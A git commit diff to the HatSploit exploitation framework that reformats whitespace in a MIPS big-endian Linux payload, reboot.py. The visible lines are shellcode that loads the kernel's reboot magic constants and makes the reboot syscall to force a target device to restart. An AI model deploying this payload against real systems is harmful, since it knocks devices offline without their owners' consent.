611f49de421c7a2088ad77aa31935bd3dcde9b09
Ivan Nikolsky <enty8080@gmail.com>
2022-01-18 20:55:52 +0300

    Update reboot.py

--- hatsploit/payloads/linux/mipsbe/reboot.py
+++ hatsploit/payloads/linux/mipsbe/reboot.py
@@ -32,8 +32,8 @@ class HatSploitPayload(Payload, PayloadTools):
                 lui $a2, 0x4321
                 ori $a2, $a2, 0xfedc
                 lui $a1, 0x2812
-                ori	$a1, $a1, 0x1969
-                lui	$a0, 0xfee1
+                ori $a1, $a1, 0x1969
+                lui $a0, 0xfee1
                 ori $a0, $a0, 0xdead
                 addiu $v0, $zero, 0xff8
                 syscall	0x40404
